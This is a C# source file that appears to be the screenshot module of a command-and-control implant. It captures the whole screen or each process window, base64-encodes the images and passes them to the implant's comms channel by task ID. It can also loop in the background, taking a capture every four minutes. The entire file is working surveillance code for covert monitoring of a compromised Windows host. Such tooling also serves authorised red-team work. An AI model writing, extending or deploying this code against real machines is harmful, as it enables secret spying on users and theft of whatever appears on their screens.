using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Core.Host
{
    internal static class Screenshot
    {
        internal static int screenshotInterval = 240000;
        internal static bool screenshotEnabled = false;

        internal static void GetScreenshot(int width = 0, int height = 0, string taskId = null)
        {
            try
            {
                if (width == 0 && height == 0)
                {
                    width = SystemInformation.VirtualScreen.Width;
                    height = SystemInformation.VirtualScreen.Height;
                }

                if (string.IsNullOrEmpty(taskId))
                {
                    taskId = Common.Comms.GetTaskId();
                }

                var bitmap = new Bitmap(width, height);
                var graphics = Graphics.FromImage(bitmap);
                var size = new Size(width, height);
                graphics.CopyFromScreen(0, 0, 0, 0, size);
                var imageMemoryStream = new MemoryStream();
                bitmap.Save(imageMemoryStream, System.Drawing.Imaging.ImageFormat.Png);

                Common.Comms.Exec(Convert.ToBase64String(imageMemoryStream.ToArray()), null, taskId);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform screen capture: {e.Message}\n");
            }
        }

        internal static void GetScreenSize()
        {
            try
            {
                var bounds = Screen.PrimaryScreen.Bounds;
                Console.WriteLine($"PrimaryScreen.Bounds.Width: {bounds.Width}");
                Console.WriteLine($"PrimaryScreen.Bounds.Height: {bounds.Height}");
                Console.WriteLine($"VirtualScreen.Width: {SystemInformation.VirtualScreen.Width}");
                Console.WriteLine($"VirtualScreen.Height: {SystemInformation.VirtualScreen.Height}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform screen size capture: {e.Message}\n");
            }
        }

        internal static void ScreenshotAllWindows(string taskId = null)
        {
            try
            {
                if (string.IsNullOrEmpty(taskId))
                {
                    taskId = Common.Comms.GetTaskId();
                }

                var processes = System.Diagnostics.Process.GetProcesses();
                foreach (var p in processes)
                {
                    try
                    {
                        var windowHandle = p.MainWindowHandle;
                        var screenshotAssembly = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "Screenshot");
                        var sOut = screenshotAssembly?.GetType("WindowStation").InvokeMember("CaptureCSSingle",
                            BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null,
                            new object[] {windowHandle}).ToString();
                        Common.Comms.Exec(sOut, null, taskId);
                    }
                    catch (Exception e)
                    {
                        Console.Write("[-] Error taking screenshot of all windows: " + e.Message);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform screen capture: {e.Message}\n");
            }
        }

        internal static void RunMultiScreenshot(int width = 0, int height = 0)
        {
            try
            {
                var taskId = Common.Comms.GetTaskId();
                ThreadPool.QueueUserWorkItem((_) =>
                {
                    try
                    {
                        while (screenshotEnabled)
                        {
                            GetScreenshot(width, height, taskId);
                            Thread.Sleep(screenshotInterval);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.Write("[-] Error taking multi-screenshot: " + e.Message);
                    }
                });
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Cannot perform multi screenshot: {e}");
            }
        }
    }
}